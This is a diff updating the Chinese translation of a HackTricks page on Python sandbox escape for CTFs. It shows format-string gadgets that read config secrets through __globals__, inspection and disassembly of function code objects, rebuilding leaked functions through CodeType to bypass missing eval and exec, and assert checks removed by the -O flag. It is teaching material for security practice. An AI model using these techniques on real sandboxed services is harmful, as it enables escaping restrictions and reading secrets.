-_**如果你知道如何通过这个漏洞执行代码，请与我联系。**_
+然而，有一个**限制**，您只能使用符号`.[]`，因此您**无法执行任意代码**，只能读取信息。\
+_**如果您知道如何通过此漏洞执行代码，请与我联系。**_
 {% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
@@ -711,16 +711,16 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-注意在正常情况下可以使用**点**（dot）来访问属性，例如 `people_obj.__init__`，也可以使用**括号**来访问**字典元素**，不需要加引号，例如 `__globals__[CONFIG]`
+注意你可以通过 **点** 的方式正常 **访问属性**，例如 `people_obj.__init__`，而 **字典元素** 则可以用 **括号** 访问，不需要引号 `__globals__[CONFIG]`。
 
-另外，可以使用 `.__dict__` 来枚举对象的元素，例如 `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+还要注意，你可以使用 `.__dict__` 来枚举对象的元素 `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`。
 
-格式字符串的一些其他有趣特性包括通过添加**`!s`**、**`!r`**、**`!a`** 分别执行指定对象中的 **`str`**、**`repr`** 和 **`ascii`** 函数的可能性：
+格式字符串的其他一些有趣特性是可以通过添加 **`!s`**、**`!r`** 和 **`!a`** 分别在指定对象中 **执行** **`str`**、**`repr`** 和 **`ascii`** 函数：
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-此外，还可以在类中**编写新的格式化程序**：
+此外，可以在类中**编写新的格式化程序**：
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -731,10 +731,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**更多关于格式字符串示例的例子**可以在[**https://pyformat.info/**](https://pyformat.info)找到
+**更多示例** 关于 **格式** **字符串** 示例可以在 [**https://pyformat.info/**](https://pyformat.info) 找到
 
 {% hint style="danger" %}
-还要检查以下页面，查找可以从Python内部对象中**读取敏感信息**的小工具：
+还请查看以下页面，了解将从 Python 内部对象中读取敏感信息的工具：
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -755,10 +755,10 @@ return 'HAL 9000'
 ## 解剖 Python 对象
 
 {% hint style="info" %}
-如果您想深入了解**Python字节码**，请阅读这篇关于该主题的**精彩**文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+如果你想深入了解 **python 字节码**，请阅读这篇关于该主题的 **精彩** 文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-在一些CTF比赛中，您可能会收到一个**包含标志的自定义函数名称**，您需要查看**函数**的**内部**以提取它。
+在某些 CTF 中，你可能会被提供一个 **自定义函数的名称，其中包含标志**，你需要查看 **函数** 的 **内部** 以提取它。
 
 这是要检查的函数：
 ```python
@@ -772,17 +772,15 @@ else:
 return "Nope"
 ```
 #### dir
-
-#### 目录
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
 dir(get_flag) #Get info tof the function
 ['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
 ```
-#### 全局变量
+#### globals
 
-`__globals__` 和 `func_globals`（相同）获取全局环境。在下面的示例中，您可以看到一些导入的模块，一些全局变量及其声明的内容：
+`__globals__` 和 `func_globals`（相同）获取全局环境。在示例中，您可以看到一些导入的模块，一些全局变量及其声明的内容：
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -791,11 +789,11 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**查看这里更多获取全局变量的位置**](./#globals-and-locals)
+[**查看更多获取 globals 的地方**](./#globals-and-locals)
 
 ### **访问函数代码**
 
-**`__code__`** 和 `func_code`: 您可以访问函数的这个属性来获取函数的代码对象。
+**`__code__`** 和 `func_code`：您可以 **访问** 这个 **属性** 来 **获取函数的代码对象**。
 ```python
 # In our current example
 get_flag.__code__
@@ -883,7 +881,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-请注意，如果您无法在Python沙箱中导入`dis`，您可以获取函数的**字节码**（`get_flag.func_code.co_code`），然后在本地**反汇编**它。您将看不到被加载的变量的内容（`LOAD_CONST`），但您可以从中猜测它们（`get_flag.func_code.co_consts`），因为`LOAD_CONST`还会告诉您被加载的变量的偏移量。
+注意，如果您无法在 Python 沙箱中导入 `dis`，您可以获取函数的 **字节码** (`get_flag.func_code.co_code`) 并在本地 **反汇编**。您将看不到正在加载的变量的内容 (`LOAD_CONST`)，但您可以从 (`get_flag.func_code.co_consts`) 猜测它们，因为 `LOAD_CONST` 还告诉您正在加载的变量的偏移量。
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -907,8 +905,8 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## 编译 Python
 
-现在，让我们想象一下，你可以**转储关于一个无法执行但你需要执行的函数的信息**。\
-就像下面的例子，你**可以访问该函数的代码对象**，但仅仅通过阅读反汇编，你**不知道如何计算标志**（_想象一个更复杂的`calc_flag`函数_）
+现在，让我们想象一下，您可以以某种方式**转储您无法执行的函数的信息**，但您**需要**去**执行**它。\
+就像在以下示例中，您**可以访问该函数的代码对象**，但仅仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
 ```python
 def get_flag(some_input):
 var1=1
@@ -923,7 +921,7 @@ return "Nope"
 ```
 ### 创建代码对象
 
-首先，我们需要知道**如何创建和执行一个代码对象**，这样我们就可以创建一个来执行我们的泄漏函数：
+首先，我们需要知道 **如何创建和执行代码对象**，以便我们可以创建一个来执行我们泄露的函数：
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -943,7 +941,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-根据 Python 版本，`code_type` 的**参数**可能有**不同的顺序**。要了解在您运行的 Python 版本中参数的顺序，最好的方法是运行：
+根据 Python 版本，`code_type` 的 **参数** 可能有 **不同的顺序**。了解您正在运行的 Python 版本中参数的顺序的最佳方法是运行：
 ```
 import types
 types.CodeType.__doc__
@@ -951,10 +949,10 @@ types.CodeType.__doc__
 ```
 {% endhint %}
 
-### 重新创建一个泄漏的函数
+### 重建泄露的函数
 
 {% hint style="warning" %}
-在下面的示例中，我们将直接从函数代码对象中获取重新创建函数所需的所有数据。在一个**真实的示例**中，执行函数所需的所有**值**就是**您需要泄漏的内容**。
+在以下示例中，我们将直接从函数代码对象获取重建函数所需的所有数据。在一个**真实的例子**中，执行函数**`code_type`**所需的所有**值**就是**你需要泄露的**内容。
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -966,12 +964,12 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### 绕过防御
+### Bypass Defenses
 
-在本文开头的先前示例中，您可以看到如何使用`compile`函数执行任何Python代码。这很有趣，因为您可以使用一行代码执行整个脚本（我们也可以使用`exec`做同样的事情）。\
-无论如何，有时在本地机器上**创建**一个**编译对象**并在**CTF机器**上执行它可能很有用（例如，因为我们在CTF中没有`compile`函数）。
+在本文开头的前几个示例中，您可以看到**如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以**在一行中执行整个脚本**，包括循环等（我们也可以使用**`exec`**做到这一点）。\
+无论如何，有时在本地机器上**创建**一个**编译对象**并在**CTF 机器**上执行它可能是有用的（例如，因为我们在 CTF 中没有 `compiled` 函数）。
 
-例如，让我们手动编译和执行一个函数，该函数读取_./poc.py_：
+例如，让我们手动编译并执行一个读取 _./poc.py_ 的函数：
 ```python
 #Locally
 def read():
@@ -998,7 +996,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-如果您无法访问 `eval` 或 `exec`，您可以创建一个**适当的函数**，但直接调用它通常会失败，并显示：_constructor not accessible in restricted mode_。因此，您需要一个**不在受限环境中的函数来调用此函数**。
+如果您无法访问 `eval` 或 `exec`，您可以创建一个 **适当的函数**，但直接调用它通常会失败，错误信息为：_构造函数在受限模式下不可访问_。因此，您需要一个 **不在受限环境中的函数来调用这个函数。**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1006,9 +1004,9 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## 反编译编译的Python
+## 反编译已编译的 Python
 
-使用类似 [**https://www.decompiler.com/**](https://www.decompiler.com) 的工具，可以对给定的编译后的Python代码进行**反编译**。
+使用像 [**https://www.decompiler.com/**](https://www.decompiler.com) 这样的工具，可以 **反编译** 给定的已编译 Python 代码。
 
 **查看这个教程**：
 
@@ -1016,12 +1014,12 @@ f(42)
 [.pyc.md](../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
 {% endcontent-ref %}
 
-## 杂项 Python
+## 其他 Python
 
 ### 断言
 
-使用参数 `-O` 优化执行的Python将删除断言语句和任何基于**debug**值的条件代码。\
-因此，像
+使用参数 `-O` 执行的 Python 将删除断言语句和任何基于 **debug** 值的条件代码。\
+因此，像这样的检查
 ```python
 def check_permission(super_user):
 try:
@@ -1032,7 +1030,7 @@ print(f"\nNot a Super User!!!\n")
 ```
 将被绕过
 
-## 参考资料
+## 参考文献
 
 * [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
 * [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
@@ -1041,22 +1039,23 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**Try Hard Security Group**
+**努力安全小组**
 
 <figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+学习和实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
+{% endhint %}
